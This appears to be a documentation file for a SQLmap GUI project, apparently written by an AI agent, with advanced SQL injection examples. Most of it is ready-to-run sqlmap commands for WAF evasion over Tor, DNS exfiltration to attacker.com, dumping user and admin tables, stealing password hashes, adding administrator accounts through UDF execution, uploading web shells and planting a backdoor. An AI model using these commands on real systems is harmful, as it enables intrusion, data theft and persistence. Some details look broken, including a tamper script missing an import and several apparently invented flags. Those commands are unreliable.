# Advanced SQL Injection Techniques Examples

This document demonstrates advanced SQL injection testing scenarios using the SQLmap GUI, including WAF bypass, complex payload customization, and sophisticated exploitation techniques.

## 🛡️ Advanced WAF Bypass Techniques

### Example 1: Multi-Layer WAF Evasion
**Scenario:** Bypass advanced WAF with multiple protection layers

**Target Information:**
- URL: `http://protected-site.com/search.php?q=test`
- WAF: Cloudflare + ModSecurity + Custom Rules
- Protection: SQL injection, XSS, command injection

**GUI Configuration:**
```
Target Tab:
├── URL: http://protected-site.com/search.php?q=test
├── Random Agent: ✓
└── Delay: 5

Injection Tab:
├── Testable Parameters: q
├── Tamper Scripts:
│   ├── space2comment
│   ├── randomcase
│   ├── apostrophemask
│   ├── base64encode
│   └── versionedkeywords
├── Prefix: ' UNION SELECT
├── Suffix: -- -
├── Invalid Logical: ✓
└── No Escape: ✓

Detection Tab:
├── Level: 5 (Maximum detection)
├── Risk: 3 (Maximum risk)
├── Techniques: BEUSTQ (All techniques)
├── Time Delay: 5
└── Retries: 3

Request Tab:
├── Tor: ✓
├── Tor Type: SOCKS5
├── Chunked: ✓
└── Timeout: 120

Miscellaneous Tab:
├── Second-Order: http://protected-site.com/profile.php?id=1
├── Alert Command: curl -X POST https://webhook.site/alert
└── Beep: ✓
```

**Generated Command:**
```bash
sqlmap -u "http://protected-site.com/search.php?q=test" -p q --tamper=space2comment,randomcase,apostrophemask,base64encode,versionedkeywords --prefix="' UNION SELECT " --suffix=" -- -" --invalid-logical --no-escape --level=5 --risk=3 --technique=BEUSTQ --time-sec=5 --retries=3 --random-agent --delay=5 --tor --tor-type=SOCKS5 --chunked --timeout=120 --second-order="http://protected-site.com/profile.php?id=1" --alert="curl -X POST https://webhook.site/alert" --beep
```

### Example 2: Custom Tamper Script Development
**Scenario:** Create and use custom tamper scripts for specific WAF

**Custom Tamper Script (`custom_waf_bypass.py`):**
```python
import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Custom WAF bypass for specific application
    """
    # Replace common SQL keywords with encoded versions
    payload = payload.replace("SELECT", "SEL/**/ECT")
    payload = payload.replace("UNION", "UNI/**/ON")
    payload = payload.replace("WHERE", "WHE/**/RE")

    # Add random comments
    payload = re.sub(r'\s+', lambda m: m.group() + '/**/' if random.random() > 0.7 else m.group(), payload)

    return payload
```

**GUI Configuration:**
```
Injection Tab:
├── Tamper Scripts: /path/to/custom_waf_bypass.py
├── Testable Parameters: id,search,filter
└── DBMS: MySQL

Detection Tab:
├── Level: 4
├── Risk: 2
└── Techniques: BEU
```

## 🔄 Second-Order Injection

### Example 3: Stored XSS to SQL Injection
**Scenario:** Exploit stored XSS that leads to SQL injection in admin panel

**Target Information:**
- XSS Storage: `http://victim.com/comment.php`
- SQL Injection: `http://victim.com/admin/comments.php?id=1`
- Payload stored and executed in different context

**GUI Configuration:**
```
Target Tab:
├── URL: http://victim.com/admin/comments.php?id=1
└── Cookie: admin_session=authenticated

Miscellaneous Tab:
├── Second-Order: http://victim.com/comment.php
├── Second-Order Data: comment=<script>stored xss</script>
└── Second-Order Method: POST

Injection Tab:
├── Testable Parameters: id
├── DBMS: PostgreSQL
└── Tamper Scripts: space2comment

Detection Tab:
├── Level: 5
├── Risk: 3
├── Techniques: BEUSTQ
└── Time Delay: 3

Request Tab:
├── Safe URL: http://victim.com/admin/keepalive.php
├── Safe POST: maintain_session=1
└── Delay: 2
```

**Generated Command:**
```bash
sqlmap -u "http://victim.com/admin/comments.php?id=1" --cookie="admin_session=authenticated" --second-order="http://victim.com/comment.php" --second-order-data="comment=<script>stored xss</script>" --second-order-method=POST -p id --dbms=postgresql --tamper=space2comment --level=5 --risk=3 --technique=BEUSTQ --time-sec=3 --safe-url="http://victim.com/admin/keepalive.php" --safe-post="maintain_session=1" --delay=2
```

## 🌐 Out-of-Band Exploitation

### Example 4: DNS Exfiltration
**Scenario:** Extract data through DNS queries when direct response is blocked

**Target Information:**
- URL: `http://firewalled-target.com/page.php?id=1`
- Firewall: Blocks all outbound HTTP traffic
- DNS: Allowed for resolution

**GUI Configuration:**
```
Target Tab:
├── URL: http://firewalled-target.com/page.php?id=1
└── Method: GET

Miscellaneous Tab:
├── DNS Domain: attacker.com
├── 3rd Level Domain: ✓
└── Ignore Proxy: ✓

Detection Tab:
├── Level: 3
├── Risk: 2
├── Techniques: T (Time-based only)
└── Time Delay: 2

Request Tab:
├── Timeout: 30
├── Delay: 1
└── Tor: ✓ (for additional anonymity)
```

**Generated Command:**
```bash
sqlmap -u "http://firewalled-target.com/page.php?id=1" --dns-domain=attacker.com --3rd-level-domain --ignore-proxy --level=3 --risk=2 --technique=T --time-sec=2 --timeout=30 --delay=1 --tor
```

### Example 5: ICMP Exfiltration (Windows)
**Scenario:** Extract data through ICMP packets on Windows systems

**Target Information:**
- URL: `http://windows-target.com/page.php?id=1`
- OS: Windows Server
- Firewall: Blocks most outbound traffic but allows ICMP

**GUI Configuration:**
```
Target Tab:
├── URL: http://windows-target.com/page.php?id=1
└── Method: GET

Miscellaneous Tab:
├── ICMP Exfiltration: ✓
└── ICMP Sleep: 1

Detection Tab:
├── Level: 4
├── Risk: 2
├── Techniques: T
└── Time Delay: 1

OS Access Tab:
├── OS Command: ping -n 1 attacker.com
└── ICMP Exfil: ✓
```

## 🔧 Custom Injection Payloads

### Example 6: Complex UNION-Based Injection
**Scenario:** Craft custom UNION injection for specific database schema

**Target Information:**
- URL: `http://target.com/products.php?id=1`
- Known Schema: 8 columns, mixed data types

**GUI Configuration:**
```
Target Tab:
├── URL: http://target.com/products.php?id=1
└── Method: GET

Injection Tab:
├── Testable Parameters: id
├── DBMS: MySQL
├── Union Columns: 8
├── Union Character: NULL
├── Prefix: ') UNION SELECT
├── Suffix: -- -
└── No Cast: ✓

Detection Tab:
├── Level: 3
├── Risk: 2
├── Techniques: U (UNION only)
└── Union Test All: ✓

Techniques Tab:
├── Union Heuristic: ✓
├── Union From Table: information_schema.tables
└── Union Character: NULL
```

**Generated Command:**
```bash
sqlmap -u "http://target.com/products.php?id=1" -p id --dbms=mysql --union-cols=8 --union-char=NULL --prefix=") UNION SELECT " --suffix=" -- -" --no-cast --level=3 --risk=2 --technique=U --union-test-all --union-heuristic --union-from=information_schema.tables
```

## 📊 Advanced Data Extraction

### Example 7: Large Dataset Handling
**Scenario:** Extract large amounts of data efficiently

**Target Information:**
- URL: `http://target.com/users.php?id=1`
- Table: `user_logs` (10 million records)
- Goal: Extract last 100,000 records

**GUI Configuration:**
```
Target Tab:
├── URL: http://target.com/users.php?id=1
└── Method: GET

Enumeration Tab:
├── Database: user_db
├── Table: user_logs
├── Dump Table: ✓
├── Start from Entry: 9900001
├── Stop at Entry: 10000000
└── Count: ✓ (to verify total records)

General Tab:
├── Output Directory: ./large_dataset/
├── CSV Format: ✓
├── Threads: 5
└── Batch: ✓

Request Tab:
├── Keep Alive: ✓
├── Timeout: 300
└── Delay: 0.1
```

**Generated Command:**
```bash
sqlmap -u "http://target.com/users.php?id=1" -D user_db -T user_logs --dump --start=9900001 --stop=10000000 --count --output-dir=./large_dataset/ --csv --threads=5 --batch --keep-alive --timeout=300 --delay=0.1
```

### Example 8: Conditional Data Extraction
**Scenario:** Extract data based on specific conditions

**Target Information:**
- URL: `http://target.com/search.php?q=admin`
- Goal: Extract admin users only

**GUI Configuration:**
```
Target Tab:
├── URL: http://target.com/search.php?q=admin
└── Method: GET

Enumeration Tab:
├── Database: user_db
├── Table: users
├── Columns: username,email,role,last_login
├── Dump Table: ✓
└── Where: role='admin'

General Tab:
├── Output Directory: ./admin_users/
├── CSV Format: ✓
└── Verbose Level: 2
```

## 🏗️ Database Structure Discovery

### Example 9: Complex Schema Mapping
**Scenario:** Map entire database schema including relationships

**Target Information:**
- URL: `http://target.com/admin.php?id=1`
- Unknown schema with multiple databases

**GUI Configuration:**
```
Target Tab:
├── URL: http://target.com/admin.php?id=1
└── Cookie: admin_auth=valid_session

Enumeration Tab:
├── Enumerate Databases: ✓
├── Enumerate Tables: ✓
├── Enumerate Columns: ✓
├── Enumerate Users: ✓
├── Enumerate Privileges: ✓
├── Enumerate Roles: ✓
└── Count: ✓

Fingerprint Tab:
├── Fingerprint DBMS: ✓
├── Banner Grab: ✓
├── Current User: ✓
├── Current Database: ✓
├── Check Version: ✓
├── Enumerate Version: ✓
└── Detect Features: ✓

General Tab:
├── Output Directory: ./schema_mapping/
├── HTML Format: ✓
├── Verbose Level: 4
└── Log File: ./schema_mapping/discovery.log
```

**Generated Command:**
```bash
sqlmap -u "http://target.com/admin.php?id=1" --cookie="admin_auth=valid_session" --dbs --tables --columns --users --privileges --roles --count --fingerprint --banner --current-user --current-db --check-version --version --check-dbms --output-dir=./schema_mapping/ --html -v 4 --log-file=./schema_mapping/discovery.log
```

## 🔐 Privilege Escalation

### Example 10: Database Privilege Escalation
**Scenario:** Escalate from low-privilege user to DBA privileges

**Target Information:**
- URL: `http://target.com/user.php?id=1`
- Current User: `webuser` (limited privileges)
- Goal: Escalate to `sa` or `root`

**GUI Configuration:**
```
Target Tab:
├── URL: http://target.com/user.php?id=1
└── Method: GET

Enumeration Tab:
├── Enumerate Users: ✓
├── Enumerate Privileges: ✓
├── Enumerate Password Hashes: ✓
└── Database: master (for SQL Server)

Brute Force Tab:
├── Brute Force Login: ✓
├── Common Usernames: ✓
├── Common Passwords: ✓
├── Threads: 2
├── Delay: 1
└── Dictionary File: ./passwords/rockyou.txt

UDF Tab:
├── UDF Drop: ✓
├── Shared Library: /path/to/lib_mysqludf_sys.so
├── UDF Exec: sys_exec
├── UDF Args: 'net localgroup administrators webuser /add'
└── DBMS: MySQL
```

**Generated Command:**
```bash
sqlmap -u "http://target.com/user.php?id=1" --users --privileges --passwords -D master --brute-force --common-user --common-pass --threads=2 --delay=1 --dict=./passwords/rockyou.txt --udf-drop --shared-lib=/path/to/lib_mysqludf_sys.so --udf-exec=sys_exec --udf-args='net localgroup administrators webuser /add' --dbms=mysql
```

## 📁 File System and OS Access

### Example 11: Web Shell Upload and Execution
**Scenario:** Upload web shell and execute system commands

**Target Information:**
- URL: `http://target.com/upload.php`
- Upload Directory: `/var/www/html/uploads/`
- Web Shell: PHP reverse shell

**GUI Configuration:**
```
Target Tab:
├── URL: http://target.com/upload.php
├── Method: POST
└── Data: file=/path/to/shell.php&upload=Upload

File System Tab:
├── Write Local File: ./webshell.php
├── Destination: /var/www/html/uploads/shell.php
└── Check File: /var/www/html/uploads/shell.php

OS Access Tab:
├── OS Command: whoami && id && uname -a
├── Interactive Shell: ✓
└── Shell: /bin/bash

Request Tab:
├── Safe URL: http://target.com/uploads/shell.php
├── Safe POST: cmd=whoami
└── Delay: 2
```

**Generated Command:**
```bash
sqlmap -u "http://target.com/upload.php" --method=POST --data="file=/path/to/shell.php&upload=Upload" --file-write=./webshell.php --file-dest=/var/www/html/uploads/shell.php --file-check=/var/www/html/uploads/shell.php --os-cmd="whoami && id && uname -a" --os-shell --os-shell=/bin/bash --safe-url="http://target.com/uploads/shell.php" --safe-post="cmd=whoami" --delay=2
```

## 🔧 Custom Exploitation Chains

### Example 12: Multi-Stage Exploitation
**Scenario:** Chain multiple vulnerabilities for complete compromise

**Stage 1: Initial Access**
```
Target Tab:
├── URL: http://target.com/login.php
├── Method: POST
└── Data: username=admin' -- &password=

Detection Tab:
├── Level: 3
├── Risk: 2
└── Techniques: BEU
```

**Stage 2: Database Enumeration**
```
Enumeration Tab:
├── Enumerate Databases: ✓
├── Enumerate Tables: ✓
├── Enumerate Users: ✓
└── Dump Table: ✓ (for users table)
```

**Stage 3: Privilege Escalation**
```
UDF Tab:
├── UDF Exec: sys_exec
└── UDF Args: 'useradd -m hacker'
```

**Stage 4: Persistence**
```
File System Tab:
├── Write Local File: ./backdoor.php
└── Destination: /var/www/html/backdoor.php
```

**Complete Command Chain:**
```bash
# Stage 1: Initial access
sqlmap -u "http://target.com/login.php" --method=POST --data="username=admin' -- &password=" --level=3 --risk=2 --technique=BEU --batch

# Stage 2: Database enumeration
sqlmap -u "http://target.com/admin.php?id=1" --cookie="authenticated_session" --dbs --tables --users --dump -D user_db -T users --batch

# Stage 3: Privilege escalation
sqlmap -u "http://target.com/admin.php?id=1" --cookie="authenticated_session" --udf-drop --shared-lib=/var/lib/mysql/udf/lib_mysqludf_sys.so --udf-exec=sys_exec --udf-args='useradd -m hacker' --batch

# Stage 4: Persistence
sqlmap -u "http://target.com/admin.php?id=1" --cookie="authenticated_session" --file-write=./backdoor.php --file-dest=/var/www/html/backdoor.php --batch
```

## ⚠️ Advanced Considerations

### Performance Optimization
- **Parallel Processing**: Use multiple threads for large datasets
- **Caching**: Enable request caching for repeated tests
- **Batch Mode**: Use batch mode for automated scanning
- **Resource Monitoring**: Monitor system resources during long scans

### Evasion Techniques
- **Traffic Obfuscation**: Use Tor, proxies, and delays
- **Payload Variation**: Employ multiple tamper scripts
- **Timing Attacks**: Use time-based techniques for stealth
- **Out-of-Band**: DNS/ICMP exfiltration for restricted environments

### Error Handling
- **Retry Logic**: Configure appropriate retry counts
- **Timeout Management**: Adjust timeouts for slow targets
- **Fallback Techniques**: Have backup techniques ready
- **Logging**: Enable comprehensive logging for troubleshooting

### Legal and Ethical Considerations
- **Authorization**: Ensure explicit permission for all testing
- **Scope Limitations**: Stay within defined testing boundaries
- **Data Handling**: Protect sensitive data discovered during testing
- **Reporting**: Document all findings and methodologies

---

## 🚀 Next Steps

For even more advanced techniques, consider:
- **Custom Tamper Script Development**
- **Machine Learning-Based WAF Bypass**
- **Zero-Day Exploitation**
- **Cloud-Native Application Testing**
- **IoT Device SQL Injection**
- **Blockchain and Cryptocurrency Applications**

Remember: Advanced techniques require deep understanding of both the target system and SQL injection fundamentals. Always test in controlled environments first.</content>
<parameter name="filePath">/home/devil/Desktop/SQLmap-GUI-Advanced-SQL-Injection-Testing-Interface/docs/examples/advanced_techniques.md
